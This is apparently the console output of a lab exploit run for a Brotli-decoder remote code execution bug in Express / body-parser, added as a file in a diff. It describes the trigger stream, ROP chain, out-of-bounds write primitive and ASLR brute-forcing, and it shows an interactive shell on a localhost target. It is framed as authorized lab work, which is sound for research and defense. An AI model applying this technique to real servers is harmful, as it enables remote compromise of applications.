@@ -1,0 +1,64 @@
+███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
+████╗  ██║██╔═══██╗██╔══██╗██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
+██╔██╗ ██║██║   ██║██║  ██║█████╗   █████╔╝███████╗███████║█████╗  ██║     ██║
+██║╚██╗██║██║   ██║██║  ██║██╔══╝  ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
+██║ ╚████║╚██████╔╝██████╔╝███████╗███████╗███████║██║  ██║███████╗███████╗███████╗
+╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+  CVE-2026-111497   Brotli-decoder RCE   ·   authorized lab only
+
+[*] Target: http://127.0.0.1:3000  POST /api/v1/import  (Content-Encoding: br -> Express 5 / body-parser 2.x)
+[*] Health check (GET /health) ...
+    target is up.
+
+[*] Building exploit primitives
+    trigger stream : 23,068,690 bytes  (SHA-256 b7a6508eb39e... verified)
+                     WBITS=10 -> 1 KiB Brotli ring buffer; an impossible
+                     distance-block switch makes the vulnerable decoder
+                     keep decoding in an invalid state.
+    ROP prefix     : 1031 bytes, carried verbatim in a leading
+                     uncompressed metablock (the bytes the OOB write copies):
+                       stack pivot  mov rax,rdi ; lea rsp,[rax+0x30]
+                       dup2(socket fd=19, 1)   -> stdout returns on our socket
+                       execvp("/activate")
+    stage 2        : 256 bytes; resumes the parked decoder and
+                     drives the corrupted write position 0x137ed748
+[*] Write primitive: memmove16(ring + pos, ...) -- a controlled 16-byte
+    out-of-bounds write. pos is a signed displacement from the Brotli ring.
+[*] Delivery: a two-write chunked POST. Write 1 (the trigger) parks the
+    decoder; after a short gap, write 2 resumes it and triggers the write.
+[*] ASLR: ring+pos is an absolute, randomized address and this bug offers no
+    way to leak it first, so we fire a FIXED guess and crash-reset the worker
+    (fresh layout) between misses until the guess matches -- probabilistic,
+    exactly as Imperva reported ('did not succeed on every attempt').
+
+[*] firing up to 32 attempts at pos=0x137ed748 fd=19
+
+[+] RCE CONFIRMED  (100%, after 24 attempt(s))
+    `/activate` ran on the target; stdout on the exploit socket:
+        one-run shell activation token received (value omitted)
+    pos=0x137ed748 fd=19
+
+[+] TARGET-BACKED COMMAND SHELL ACTIVE
+    endpoint: http://127.0.0.1:3000/api/v1/shell
+    identity: node
+    commands execute inside the vulnerable container; timeout=10s
+
+node@node2shell:/app$ whoami
+node
+
+node@node2shell:/app$ id
+uid=1000(node) gid=1000(node) groups=1000(node)
+
+node@node2shell:/app$ pwd
+/app
+
+node@node2shell:/app$ cd /tmp
+
+node@node2shell:/tmp$ pwd
+/tmp
+
+node@node2shell:/tmp$ printf NODE2SHELL_ACTIVE_SHELL
+NODE2SHELL_ACTIVE_SHELL
+
+[+] ACTIVE SHELL VALIDATED: multiple commands and cwd state succeeded
+[+] target-backed shell closed and token revoked
